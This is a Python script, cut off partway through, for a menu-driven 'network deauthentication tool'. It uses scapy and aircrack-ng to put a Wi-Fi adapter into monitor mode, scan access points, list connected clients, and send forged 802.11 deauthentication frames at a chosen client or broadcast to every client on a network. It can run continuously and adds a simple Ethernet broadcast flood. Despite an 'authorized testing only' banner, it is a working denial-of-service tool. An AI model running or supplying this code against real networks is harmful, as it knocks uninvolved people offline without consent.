#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import threading
import signal
from datetime import datetime
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt, Dot11Beacon
from scapy.layers.l2 import Ether, ARP
import argparse
import json
import re
from typing import List, Dict, Optional, Tuple, Set
import csv
import netifaces

# Global variables
selected_interfaces = {"wlan": "wlan0", "eth": "eth0"}  # Default interfaces
selected_network = None
selected_client = None
scan_results = []
clients_list = []
running = True
log_file = "wifi_deauth_log.csv"
attack_threads = []
monitor_mode_enabled = False
original_wifi_mode = None

class Logger:
    def __init__(self, log_file: str = "wifi_deauth_log.csv"):
        self.log_file = log_file
        self.ensure_log_file()
    
    def ensure_log_file(self):
        """Create log file with headers if it doesn't exist"""
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Timestamp', 'Action', 'Interface_Type', 'Interface_Name', 
                               'BSSID', 'ESSID', 'Client_MAC', 'Channel', 
                               'Duration', 'Packets_Sent', 'Status'])
    
    def log(self, action: str, interface_type: str = "", interface_name: str = "", 
            bssid: str = "", essid: str = "", client_mac: str = "", 
            channel: str = "", duration: str = "", packets: str = "", status: str = ""):
        """Log an action to the CSV file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(self.log_file, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, action, interface_type, interface_name, 
                           bssid, essid, client_mac, channel, duration, packets, status])
        
        print(f"[LOG] {timestamp} - {action}: {status}")

logger = Logger(log_file)

def check_root():
    """Check if script is running as root"""
    if os.geteuid() != 0:
        print("This script requires root privileges!")
        print("Please run with sudo.")
        sys.exit(1)

def get_available_interfaces() -> Dict[str, List[str]]:
    """Get all available network interfaces categorized by type"""
    interfaces = {"wlan": [], "eth": []}
    
    try:
        # Get all interfaces
        all_interfaces = netifaces.interfaces()
        
        for iface in all_interfaces:
            # Skip loopback and virtual interfaces
            if iface.startswith('lo') or iface.startswith('docker') or iface.startswith('veth'):
                continue
            
            # Check if it's wireless
            wireless_path = f'/sys/class/net/{iface}/wireless'
            if os.path.exists(wireless_path):
                interfaces["wlan"].append(iface)
            # Check if it's ethernet (or likely ethernet)
            elif 'eth' in iface or 'enp' in iface or 'ens' in iface or 'eno' in iface:
                interfaces["eth"].append(iface)
            # Also check for wlan interfaces that might not have wireless path
            elif 'wlan' in iface or 'wlp' in iface or 'wifi' in iface:
                interfaces["wlan"].append(iface)
        
        return interfaces
    except Exception as e:
        print(f"Error detecting interfaces: {e}")
        # Fallback method
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'wlan' in line or 'wlp' in line:
                    match = re.search(r'^\d+: (\w+):', line)
                    if match:
                        interfaces["wlan"].append(match.group(1))
                elif 'eth' in line or 'enp' in line or 'ens' in line:
                    match = re.search(r'^\d+: (\w+):', line)
                    if match:
                        interfaces["eth"].append(match.group(1))
        except:
            pass
        
        return interfaces

def check_interface_mode(interface: str) -> str:
    """Check the current mode of a wireless interface"""
    try:
        result = subprocess.run(['iwconfig', interface], 
                              capture_output=True, text=True)
        
        if "Mode:Monitor" in result.stdout:
            return "monitor"
        elif "Mode:Managed" in result.stdout:
            return "managed"
        else:
            return "unknown"
    except:
        return "unknown"

def get_original_mode(interface: str) -> str:
    """Get and store the original mode of the interface"""
    try:
        result = subprocess.run(['iwconfig', interface], 
                              capture_output=True, text=True)
        
        if "Mode:Managed" in result.stdout:
            return "managed"
        elif "Mode:Monitor" in result.stdout:
            return "monitor"
        else:
            return "unknown"
    except:
        return "unknown"

def ensure_monitor_mode(interface: str) -> bool:
    """Ensure interface is in monitor mode, return to original mode after if needed"""
    global monitor_mode_enabled, original_wifi_mode
    
    current_mode = check_interface_mode(interface)
    
    if current_mode == "monitor":
        print(f"{interface} is already in monitor mode")
        monitor_mode_enabled = True
        return True
    
    print(f"{interface} is in {current_mode} mode. Switching to monitor mode...")
    
    try:
        # Store original mode if not already stored
        if original_wifi_mode is None:
            original_wifi_mode = current_mode
        
        # Kill interfering processes
        subprocess.run(['airmon-ng', 'check', 'kill'], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        
        # Use airmon-ng to set monitor mode
        print(f"Setting {interface} to monitor mode using airmon-ng...")
        result = subprocess.run(['airmon-ng', 'start', interface], 
                              capture_output=True, text=True, timeout=30)
        
        if "monitor mode enabled" in result.stdout.lower() or "monitor mode vif" in result.stdout.lower():
            # Check for renamed interface
            for line in result.stdout.split('\n'):
                if 'monitor mode enabled on' in line.lower():
                    match = re.search(r'enabled on (\w+)', line, re.IGNORECASE)
                    if match:
                        new_iface = match.group(1)
                        if new_iface != interface:
                            print(f"Interface renamed to: {new_iface}")
                            selected_interfaces["wlan"] = new_iface
                            interface = new_iface
            
            monitor_mode_enabled = True
            print(f"Successfully set {interface} to monitor mode")
            return True
        else:
            print("airmon-ng failed, trying manual method...")
            
            # Manual method
            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                          capture_output=True, stderr=subprocess.DEVNULL)
            time.sleep(1)
            
            subprocess.run(['iwconfig', interface, 'mode', 'monitor'], 
                          capture_output=True, stderr=subprocess.DEVNULL)
            time.sleep(1)
            
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                          capture_output=True, stderr=subprocess.DEVNULL)
            time.sleep(1)
            
            # Verify
            if check_interface_mode(interface) == "monitor":
                monitor_mode_enabled = True
                print(f"Successfully set {interface} to monitor mode (manual)")
                return True
            else:
                print("Failed to set monitor mode")
                return False
                
    except Exception as e:
        print(f"Error setting monitor mode: {e}")
        return False

def restore_managed_mode():
    """Restore Wi-Fi interface to managed mode"""
    global monitor_mode_enabled, original_wifi_mode
    
    if not monitor_mode_enabled or original_wifi_mode != "managed":
        return
    
    interface = selected_interfaces.get("wlan")
    if not interface:
        return
    
    try:
        print(f"Restoring {interface} to managed mode...")
        
        # Bring interface down
        subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                      capture_output=True, stderr=subprocess.DEVNULL)
        time.sleep(1)
        
        # Set to managed mode
        subprocess.run(['iwconfig', interface, 'mode', 'managed'], 
                      capture_output=True, stderr=subprocess.DEVNULL)
        time.sleep(1)
        
        # Bring interface up
        subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                      capture_output=True, stderr=subprocess.DEVNULL)
        time.sleep(1)
        
        # Restart network manager to reconnect
        subprocess.run(['systemctl', 'restart', 'NetworkManager'], 
                      capture_output=True, stderr=subprocess.DEVNULL)
        
        monitor_mode_enabled = False
        print("Restored to managed mode")
        
    except Exception as e:
        print(f"Error restoring managed mode: {e}")

def scan_networks_improved(interface: str) -> List[Dict]:
    """Improved scanning for Wi-Fi networks"""
    print(f"\nScanning for Wi-Fi networks on {interface}...")
    print("This may take 10-15 seconds...")
    
    networks = []
    seen_bssids = set()
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            try:
                # Get BSSID (MAC address of AP)
                if hasattr(pkt, 'addr2'):
                    bssid = pkt.addr2
                elif hasattr(pkt[Dot11], 'addr2'):
                    bssid = pkt[Dot11].addr2
                else:
                    return
                
                if bssid in seen_bssids:
                    return
                
                seen_bssids.add(bssid)
                
                # Extract ESSID
                essid = None
                if pkt.haslayer(Dot11Elt):
                    # Look for ESSID in Dot11Elt layers
                    elt = pkt[Dot11Elt]
                    while elt:
                        if elt.ID == 0:  # ESSID
                            try:
                                if elt.info:
                                    essid = elt.info.decode('utf-8', errors='ignore')
                                else:
                                    essid = "<hidden>"
                            except:
                                essid = "<hidden>"
                            break
                        elt = elt.payload
                
                # Extract channel
                channel = None
                if pkt.haslayer(Dot11Elt):
                    elt = pkt[Dot11Elt]
                    while elt:
                        if elt.ID == 3:  # DS Parameter Set
                            if elt.info:
                                channel = str(ord(elt.info[0:1]))
                            break
                        elt = elt.payload
                
                # Extract signal strength if available
                signal_strength = None
                if hasattr(pkt, 'dBm_AntSignal'):
                    signal_strength = pkt.dBm_AntSignal
                elif hasattr(pkt, 'notdecoded'):
                    # Try to extract from RadioTap
                    pass
                
                # Extract encryption type
                encryption = "Unknown"
                if pkt.haslayer(Dot11Elt):
                    elt = pkt[Dot11Elt]
                    while elt:
                        if elt.ID == 48:  # RSN Information
                            encryption = "WPA2"
                            break
                        elif elt.ID == 221:  # Vendor Specific
                            if b'WPA' in elt.info or b'wpa' in elt.info:
                                encryption = "WPA"
                                break
                        elt = elt.payload
                
                network_info = {
                    'BSSID': bssid,
                    'ESSID': essid or "<hidden>",
                    'Channel': channel or "Unknown",
                    'Signal': signal_strength or "N/A",
                    'Encryption': encryption,
                    'Interface': interface
                }
                
                # Add to networks if not already present
                if not any(n['BSSID'] == bssid for n in networks):
                    networks.append(network_info)
                    
            except Exception as e:
                # Silently continue on packet processing errors
                pass
    
    try:
        # Start scanning
        print("Starting scan... (Press Ctrl+C to stop early)")
        
        # Use scapy's sniff with timeout
        sniff(iface=interface, prn=packet_handler, timeout=15, store=0)
        
        print(f"\nScan completed. Found {len(networks)} networks.")
        
        # Sort by signal strength if available
        networks.sort(key=lambda x: (
            x['Signal'] if isinstance(x['Signal'], int) else -100,
            x['ESSID']
        ), reverse=True)
        
    except KeyboardInterrupt:
        print("\nScan interrupted by user.")
    except Exception as e:
        print(f"Error during scan: {e}")
        print("Trying alternative scanning method...")
        networks = scan_networks_fallback(interface)
    
    return networks

def scan_networks_fallback(interface: str) -> List[Dict]:
    """Fallback scanning method using iwlist"""
    networks = []
    
    try:
        print("Trying iwlist scan...")
        result = subprocess.run(['iwlist', interface, 'scan'], 
                              capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            lines = result.stdout.split('\n')
            current_cell = {}
            
            for line in lines:
                line = line.strip()
                
                if 'Cell' in line and 'Address:' in line:
                    if current_cell and 'BSSID' in current_cell:
                        networks.append(current_cell.copy())
                    current_cell = {}
                    match = re.search(r'Address:\s*([0-9A-Fa-f:]+)', line)
                    if match:
                        current_cell['BSSID'] = match.group(1)
                
                elif 'ESSID:' in line:
                    match = re.search(r'ESSID:"([^"]*)"', line)
                    if match:
                        current_cell['ESSID'] = match.group(1) if match.group(1) else "<hidden>"
                    else:
                        current_cell['ESSID'] = "<hidden>"
                
                elif 'Channel:' in line:
                    match = re.search(r'Channel:(\d+)', line)
                    if match:
                        current_cell['Channel'] = match.group(1)
                
                elif 'Frequency:' in line:
                    match = re.search(r'(\d+\.\d+) GHz', line)
                    if match:
                        freq = float(match.group(1))
                        # Convert frequency to channel
                        if 2.4 <= freq <= 2.5:
                            channel = int((freq - 2.412) / 0.005) + 1
                            current_cell['Channel'] = str(channel)
                        elif 5.0 <= freq <= 6.0:
                            channel = int((freq - 5.0) / 0.005) + 36
                            current_cell['Channel'] = str(channel)
            
            # Add the last cell
            if current_cell and 'BSSID' in current_cell:
                networks.append(current_cell)
        
        print(f"Found {len(networks)} networks with iwlist")
        
    except Exception as e:
        print(f"iwlist scan failed: {e}")
    
    return networks

def display_networks_table(networks: List[Dict], network_type: str = "Wi-Fi"):
    """Display networks in a nice table format"""
    if not networks:
        print(f"\nNo {network_type} networks found.")
        return
    
    print(f"\n{network_type} Networks Found:")
    print("="*100)
    print(f"{'#':<3} {'BSSID':<18} {'Channel':<8} {'ESSID':<25} {'Signal':<10} {'Encryption':<12} {'Interface':<10}")
    print("="*100)
    
    for i, network in enumerate(networks, 1):
        bssid = network.get('BSSID', 'N/A')
        channel = network.get('Channel', 'N/A')
        essid = network.get('ESSID', 'N/A')
        signal = network.get('Signal', 'N/A')
        encryption = network.get('Encryption', 'N/A')
        interface = network.get('Interface', 'N/A')
        
        # Format signal strength
        if isinstance(signal, int):
            signal_str = f"{signal} dBm"
        else:
            signal_str = str(signal)
        
        # Truncate long ESSIDs
        if len(essid) > 24:
            essid = essid[:21] + "..."
        
        print(f"{i:<3} {bssid:<18} {channel:<8} {essid:<25} {signal_str:<10} {encryption:<12} {interface:<10}")
    
    print("="*100)

def select_and_scan_clients(interface: str, bssid: str, channel: str) -> List[Dict]:
    """Select a network and scan for connected clients"""
    print(f"\nScanning for clients on network {bssid} (Channel {channel})...")
    print("This will take about 10 seconds...")
    
    clients = []
    
    try:
        # First, ensure we're on the right channel
        result = subprocess.run(['iwconfig', interface, 'channel', channel],
                              capture_output=True, text=True, timeout=5)
        
        if result.returncode != 0:
            print(f"Failed to set channel {channel}")
            return clients
        
        # Use airodump-ng if available
        airodump_path = subprocess.run(['which', 'airodump-ng'], 
                                      capture_output=True).stdout.decode().strip()
        
        if airodump_path:
            print("Using airodump-ng for client discovery...")
            
            # Create temporary file for output
            temp_dir = "/tmp"
            temp_prefix = f"client_scan_{int(time.time())}"
            
            cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--channel', channel,
                '--output-format', 'csv',
                '--write', f"{temp_dir}/{temp_prefix}",
                interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Let it run for 10 seconds
            time.sleep(10)
            process.terminate()
            process.wait()
            
            # Read the CSV file
            csv_file = f"{temp_dir}/{temp_prefix}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                # Parse CSV content
                lines = content.split('\n')
                in_clients_section = False
                
                for line in lines:
                    if line.startswith('Station MAC,'):
                        in_clients_section = True
                        continue
                    
                    if in_clients_section and line.strip():
                        parts = line.split(',')
                        if len(parts) >= 1:
                            client_mac = parts[0].strip()
                            if client_mac and len(client_mac) == 17:  # Valid MAC
                                clients.append({
                                    'MAC': client_mac,
                                    'BSSID': bssid,
                                    'Interface': interface,
                                    'Type': 'Wi-Fi'
                                })
                
                # Clean up
                try:
                    os.remove(csv_file)
                    kismet_file = csv_file.replace('.csv', '.kismet.csv')
                    cap_file = csv_file.replace('.csv', '.cap')
                    if os.path.exists(kismet_file):
                        os.remove(kismet_file)
                    if os.path.exists(cap_file):
                        os.remove(cap_file)
                except:
                    pass
        
        # If airodump-ng failed or not available, try manual scan
        if not clients:
            print("Trying manual client discovery...")
            clients = manual_client_discovery(interface, bssid, channel)
        
        print(f"Found {len(clients)} client(s)")
        
    except Exception as e:
        print(f"Error scanning for clients: {e}")
        clients = manual_client_discovery(interface, bssid, channel)
    
    return clients

def manual_client_discovery(interface: str, bssid: str, channel: str) -> List[Dict]:
    """Manual client discovery using scapy"""
    clients = []
    seen_clients = set()
    
    def client_packet_handler(pkt):
        try:
            if pkt.haslayer(Dot11):
                # Check if packet is from or to our target BSSID
                src = pkt.addr2
                dst = pkt.addr1
                
                if src and dst:
                    # If source is client and destination is AP
                    if src != bssid and dst == bssid and src not in seen_clients:
                        if is_valid_mac(src):
                            clients.append({
                                'MAC': src,
                                'BSSID': bssid,
                                'Interface': interface,
                                'Type': 'Wi-Fi'
                            })
                            seen_clients.add(src)
                    
                    # If source is AP and destination is client
                    elif src == bssid and dst != bssid and dst not in seen_clients:
                        if is_valid_mac(dst):
                            clients.append({
                                'MAC': dst,
                                'BSSID': bssid,
                                'Interface': interface,
                                'Type': 'Wi-Fi'
                            })
                            seen_clients.add(dst)
        except:
            pass
    
    try:
        # Set channel
        subprocess.run(['iwconfig', interface, 'channel', channel],
                      capture_output=True, stderr=subprocess.DEVNULL)
        
        # Sniff for client packets
        print("Listening for client traffic...")
        sniff(iface=interface, prn=client_packet_handler, timeout=10, store=0)
        
    except Exception as e:
        print(f"Manual client discovery error: {e}")
    
    return clients

def is_valid_mac(mac: str) -> bool:
    """Check if a string is a valid MAC address"""
    if not mac:
        return False
    
    mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    return bool(re.match(mac_pattern, mac))

def deauth_client(interface: str, interface_type: str, bssid: str, 
                  client_mac: str, count: int = 0, duration: int = 0) -> threading.Thread:
    """Deauthenticate a specific client"""
    def deauth_thread():
        nonlocal interface, interface_type, bssid, client_mac
        
        packets_sent = 0
        start_time = time.time()
        
        if interface_type == "wlan":
            # Wi-Fi deauthentication
            print(f"\nStarting deauth attack on {client_mac}")
            print(f"Target AP: {bssid}")
            print(f"Interface: {interface}")
            
            # Create deauth packets
            # Packet from AP to client
            pkt1 = RadioTap() / \
                   Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / \
                   Dot11Deauth(reason=7)
            
            # Packet from client to AP
            pkt2 = RadioTap() / \
                   Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) / \
                   Dot11Deauth(reason=7)
            
            try:
                if duration > 0:
                    print(f"Duration: {duration} seconds")
                    while (time.time() - start_time) < duration and running:
                        sendp(pkt1, iface=interface, count=1, verbose=0)
                        sendp(pkt2, iface=interface, count=1, verbose=0)
                        packets_sent += 2
                        time.sleep(0.1)
                        
                        # Progress indicator
                        if int(time.time() - start_time) % 5 == 0:
                            print(f"  Sent {packets_sent} packets...")
                
                elif count > 0:
                    print(f"Packets to send: {count * 2} ({count} each direction)")
                    for i in range(count):
                        if not running:
                            break
                        sendp(pkt1, iface=interface, count=1, verbose=0)
                        sendp(pkt2, iface=interface, count=1, verbose=0)
                        packets_sent += 2
                        time.sleep(0.1)
                        
                        if i % 10 == 0:
                            print(f"  Sent {packets_sent} packets...")
                
                else:
                    print("Continuous attack (press Ctrl+C or use Stop option)")
                    while running:
                        sendp(pkt1, iface=interface, count=1, verbose=0)
                        sendp(pkt2, iface=interface, count=1, verbose=0)
                        packets_sent += 2
                        time.sleep(0.1)
                        
                        if packets_sent % 100 == 0:
                            print(f"  Sent {packets_sent} packets...")
                
                print(f"\nAttack completed. Total packets sent: {packets_sent}")
                logger.log("Deauth_Client", "Wi-Fi", interface, bssid, "", client_mac, 
                          "", f"{duration}s" if duration > 0 else f"{count}pkts", 
                          str(packets_sent), "Completed")
                
            except Exception as e:
                print(f"\nDeauth error: {e}")
                logger.log("Deauth_Client", "Wi-Fi", interface, bssid, "", client_mac,
                          "", f"{duration}s" if duration > 0 else f"{count}pkts", 
                          str(packets_sent), f"Error: {e}")
        
        elif interface_type == "eth":
            # Ethernet attack (simplified for demo)
            print(f"\nStarting Ethernet attack on {client_mac}")
            print("Note: This is a simplified demonstration")
            
            try:
                # Simple broadcast packet
                pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                      IP(dst="255.255.255.255") / \
                      UDP() / b'X' * 100
                
                if duration > 0:
                    while (time.time() - start_time) < duration and running:
                        sendp(pkt, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        time.sleep(1)
                
                elif count > 0:
                    for _ in range(count // 10):
                        if not running:
                            break
                        sendp(pkt, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        time.sleep(1)
                
                else:
                    while running:
                        sendp(pkt, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        time.sleep(1)
                
                print(f"\nEthernet attack completed. Packets sent: {packets_sent}")
                logger.log("Ethernet_Attack", "Ethernet", interface, "", "", client_mac,
                          "", f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), "Completed")
                
            except Exception as e:
                print(f"\nEthernet attack error: {e}")
                logger.log("Ethernet_Attack", "Ethernet", interface, "", "", client_mac,
                          "", f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), f"Error: {e}")
    
    thread = threading.Thread(target=deauth_thread)
    thread.daemon = True
    thread.start()
    attack_threads.append(thread)
    return thread

def display_menu_header():
    """Display the main menu header"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print("="*80)
    print("NETWORK DEAUTHENTICATION TOOL")
    print("Enhanced Wi-Fi + Ethernet Support")
    print("For Educational and Authorized Testing Only!")
    print("="*80)
    
    # Show current interface status
    interfaces = get_available_interfaces()
    print("\nCurrent Status:")
    print(f"  Wi-Fi Interface: {selected_interfaces.get('wlan', 'Not set')}")
    if selected_interfaces.get('wlan'):
        mode = check_interface_mode(selected_interfaces['wlan'])
        print(f"    Mode: {mode}")
    
    print(f"  Ethernet Interface: {selected_interfaces.get('eth', 'Not set')}")
    print(f"  Monitor Mode: {'Enabled' if monitor_mode_enabled else 'Disabled'}")
    print("="*80)

def stop_all_attacks():
    """Stop all running attacks"""
    global running, attack_threads
    running = False
    print("\nStopping all attacks...")
    
    # Wait for threads to finish
    for thread in attack_threads:
        if thread.is_alive():
            thread.join(timeout=2)
    
    attack_threads = []
    running = True  # Reset for next attacks
    print("All attacks stopped.")

def main():
    global selected_network, selected_client, scan_results, clients_list, running
    global selected_interfaces, monitor_mode_enabled
    
    check_root()
    
    # Initial interface detection
    interfaces = get_available_interfaces()
    
    # Auto-select interfaces if not set
    if not selected_interfaces.get("wlan") and interfaces["wlan"]:
        selected_interfaces["wlan"] = interfaces["wlan"][0]
    
    if not selected_interfaces.get("eth") and interfaces["eth"]:
        selected_interfaces["eth"] = interfaces["eth"][0]
    
    while True:
        display_menu_header()
        
        print("\nMAIN MENU")
        print("1. Scan for Wi-Fi networks")
        print("2. Select Wi-Fi network for client scanning")
        print("3. Deauthenticate specific client")
        print("4. Deauthenticate all clients from network")
        print("5. Configure network interfaces")
        print("6. Check adapter status")
        print("7. View logs")
        print("8. Stop all attacks")
        print("9. Restore Wi-Fi to managed mode")
        print("0. Exit")
        
        print("\n" + "="*80)
        choice = input("Select option: ").strip()
        
        if choice == '1':
            # Scan for Wi-Fi networks
            if not selected_interfaces.get("wlan"):
                print("\nNo Wi-Fi interface configured!")
                input("Press Enter to continue...")
                continue
            
            # Ensure monitor mode is enabled
            if not ensure_monitor_mode(selected_interfaces["wlan"]):
                print("Failed to enable monitor mode!")
                input("Press Enter to continue...")
                continue
            
            print(f"\nStarting network scan on {selected_interfaces['wlan']}...")
            print("This will take about 15 seconds...")
            
            scan_results = scan_networks_improved(selected_interfaces["wlan"])
            
            if scan_results:
                display_networks_table(scan_results, "Wi-Fi")
                logger.log("Wi-Fi_Scan", "Wi-Fi", selected_interfaces["wlan"], 
                          status=f"Found {len(scan_results)} networks")
            else:
                print("\nNo networks found. Possible issues:")
                print("1. No Wi-Fi networks in range")
                print("2. Interface not in monitor mode")
                print("3. Driver issues with monitor mode")
                logger.log("Wi-Fi_Scan", "Wi-Fi", selected_interfaces["wlan"], 
                          status="No networks found")
            
            input("\nPress Enter to continue...")
        
        elif choice == '2':
            # Select network for client scanning
            if not scan_results:
                print("\nPlease scan for networks first (Option 1)!")
                input("Press Enter to continue...")
                continue
            
            display_networks_table(scan_results, "Wi-Fi")
            
            try:
                net_choice = int(input(f"\nSelect network (1-{len(scan_results)}): "))
                if 1 <= net_choice <= len(scan_results):
                    selected_network = scan_results[net_choice-1]
                    
                    print(f"\nSelected Network:")
                    print(f"  BSSID:    {selected_network['BSSID']}")
                    print(f"  ESSID:    {selected_network['ESSID']}")
                    print(f"  Channel:  {selected_network['Channel']}")
                    print(f"  Signal:   {selected_network.get('Signal', 'N/A')}")
                    print(f"  Interface: {selected_network['Interface']}")
                    
                    # Scan for clients
                    clients_list = select_and_scan_clients(
                        selected_network['Interface'],
                        selected_network['BSSID'],
                        selected_network['Channel']
                    )
                    
                    if clients_list:
                        print(f"\nFound {len(clients_list)} client(s):")
                        for i, client in enumerate(clients_list, 1):
                            print(f"  {i}. {client['MAC']}")
                        logger.log("Client_Scan", "Wi-Fi", selected_network['Interface'],
                                 selected_network['BSSID'], selected_network['ESSID'],
                                 status=f"Found {len(clients_list)} clients")
                    else:
                        print("\nNo clients found on this network.")
                        print("Try again when clients are actively connected.")
                        logger.log("Client_Scan", "Wi-Fi", selected_network['Interface'],
                                 selected_network['BSSID'], selected_network['ESSID'],
                                 status="No clients found")
                else:
                    print("Invalid selection!")
            except ValueError:
                print("Please enter a valid number!")
            
            input("\nPress Enter to continue...")
        
        elif choice == '3':
            # Deauthenticate specific client
            if not selected_network:
                print("\nPlease select a network first (Option 2)!")
                input("Press Enter to continue...")
                continue
            
            if not clients_list:
                print("\nNo clients available. Please scan for clients first.")
                input("Press Enter to continue...")
                continue
            
            print(f"\nNetwork: {selected_network['ESSID']} ({selected_network['BSSID']})")
            print(f"Channel: {selected_network['Channel']}")
            print(f"\nAvailable clients:")
            
            for i, client in enumerate(clients_list, 1):
                print(f"  {i}. {client['MAC']}")
            
            try:
                client_choice = int(input(f"\nSelect client (1-{len(clients_list)}): "))
                if 1 <= client_choice <= len(clients_list):
                    selected_client = clients_list[client_choice-1]
                    
                    print(f"\nSelected Client: {selected_client['MAC']}")
                    print("\nAttack Options:")
                    print("  1. Send specific number of packets")
                    print("  2. Send for specific duration")
                    print("  3. Continuous attack")
                    
                    attack_choice = input("\nSelect attack type: ").strip()
                    
                    if attack_choice == '1':
                        try:
                            count = int(input("Number of deauth packets (each direction): "))
                            if count > 0:
                                print(f"\nStarting attack with {count} packets...")
                                deauth_client(
                                    selected_network['Interface'], "wlan",
                                    selected_network['BSSID'], selected_client['MAC'],
                                    count=count
                                )
                                print("Attack started. Check logs for status.")
                            else:
                                print("Invalid number!")
                        except ValueError:
                            print("Invalid input!")
                    
                    elif attack_choice == '2':
                        try:
                            duration = int(input("Duration in seconds: "))
                            if duration > 0:
                                print(f"\nStarting attack for {duration} seconds...")
                                deauth_client(
                                    selected_network['Interface'], "wlan",
                                    selected_network['BSSID'], selected_client['MAC'],
                                    duration=duration
                                )
                                print("Attack started. Check logs for status.")
                            else:
                                print("Invalid duration!")
                        except ValueError:
                            print("Invalid input!")
                    
                    elif attack_choice == '3':
                        print("\nStarting continuous attack...")
                        print("Use Option 8 to stop the attack")
                        deauth_client(
                            selected_network['Interface'], "wlan",
                            selected_network['BSSID'], selected_client['MAC']
                        )
                        print("Continuous attack started.")
                    
                    else:
                        print("Invalid choice!")
                
                else:
                    print("Invalid selection!")
            
            except ValueError:
                print("Please enter a valid number!")
            
            input("\nPress Enter to continue...")
        
        elif choice == '4':
            # Deauthenticate all clients (simplified)
            if not selected_network:
                print("\nPlease select a network first (Option 2)!")
                input("Press Enter to continue...")
                continue
            
            print(f"\nNetwork: {selected_network['ESSID']} ({selected_network['BSSID']})")
            print("Warning: This will affect all clients on the network!")
            
            confirm = input("\nAre you sure? (yes/no): ").strip().lower()
            if confirm == 'yes':
                print("\nStarting broadcast deauth attack...")
                
                # Create broadcast deauth packet
                pkt = RadioTap() / \
                      Dot11(addr1="ff:ff:ff:ff:ff:ff", 
                            addr2=selected_network['BSSID'], 
                            addr3=selected_network['BSSID']) / \
                      Dot11Deauth(reason=7)
                
                def broadcast_attack():
                    packets = 0
                    while running:
                        sendp(pkt, iface=selected_network['Interface'], count=10, verbose=0)
                        packets += 10
                        time.sleep(0.5)
                    
                    print(f"Broadcast attack stopped. Sent {packets} packets.")
                
                thread = threading.Thread(target=broadcast_attack)
                thread.daemon = True
                thread.start()
                attack_threads.append(thread)
                
                print("Broadcast attack started. Use Option 8 to stop.")
                logger.log("Broadcast_Deauth", "Wi-Fi", selected_network['Interface'],
                         selected_network['BSSID'], selected_network['ESSID'],
                         status="Started")
            
            input("\nPress Enter to continue...")
        
        elif choice == '5':
            # Configure interfaces
            print("\nConfigure Interfaces:")
            print("1. Configure Wi-Fi interface")
            print("2. Configure Ethernet interface")
            print("3. View available interfaces")
            
            config_choice = input("\nSelect option: ").strip()
            
            if config_choice == '1':
                interfaces = get_available_interfaces()
                if not interfaces["wlan"]:
                    print("No Wi-Fi interfaces found!")
                else:
                    print("\nAvailable Wi-Fi interfaces:")
                    for i, iface in enumerate(interfaces["wlan"], 1):
                        print(f"  {i}. {iface}")
                    
                    try:
                        choice = int(input(f"\nSelect (1-{len(interfaces['wlan'])}): "))
                        if 1 <= choice <= len(interfaces["wlan"]):
                            selected_interfaces["wlan"] = interfaces["wlan"][choice-1]
                            print(f"Wi-Fi interface set to: {selected_interfaces['wlan']}")
                            
                            # Check current mode
                            mode = check_interface_mode(selected_interfaces["wlan"])
                            print(f"Current mode: {mode}")
                            
                            if mode != "monitor":
                                answer = input("Switch to monitor mode now? (y/n): ").lower()
                                if answer == 'y':
                                    ensure_monitor_mode(selected_interfaces["wlan"])
                        else:
                            print("Invalid selection!")
                    except ValueError:
                        print("Invalid input!")
            
            elif config_choice == '2':
                interfaces = get_available_interfaces()
                if not interfaces["eth"]:
                    print("No Ethernet interfaces found!")
                else:
                    print("\nAvailable Ethernet interfaces:")
                    for i, iface in enumerate(interfaces["eth"], 1):
                        print(f"  {i}. {iface}")
                    
                    try:
                        choice = int(input(f"\nSelect (1-{len(interfaces['eth'])}): "))
                        if 1 <= choice <= len(interfaces["eth"]):
                            selected_interfaces["eth"] = interfaces["eth"][choice-1]
                            print(f"Ethernet interface set to: {selected_interfaces['eth']}")
                        else:
                            print("Invalid selection!")
                    except ValueError:
                        print("Invalid input!")
            
            elif config_choice == '3':
                interfaces = get_available_interfaces()
                print("\nAvailable Interfaces:")
                print("Wi-Fi interfaces:", interfaces["wlan"] or "None")
                print("Ethernet interfaces:", interfaces["eth"] or "None")
            
            input("\nPress Enter to continue...")
        
        elif choice == '6':
            # Check adapter status
            print("\nNetwork Adapter Status")
            print("="*60)
            
            interfaces = get_available_interfaces()
            
            for iface_type, iface_list in interfaces.items():
                print(f"\n{iface_type.upper()} Interfaces:")
                if not iface_list:
                    print("  None found")
                    continue
                
                for iface in iface_list:
                    print(f"\n  {iface}:")
                    
                    # Get basic info
                    try:
                        # MAC address
                        with open(f'/sys/class/net/{iface}/address', 'r') as f:
                            mac = f.read().strip()
                            print(f"    MAC: {mac}")
                        
                        # Status
                        with open(f'/sys/class/net/{iface}/operstate', 'r') as f:
                            state = f.read().strip()
                            print(f"    State: {state}")
                        
                        # For Wi-Fi interfaces
                        if iface_type == "wlan":
                            result = subprocess.run(['iwconfig', iface], 
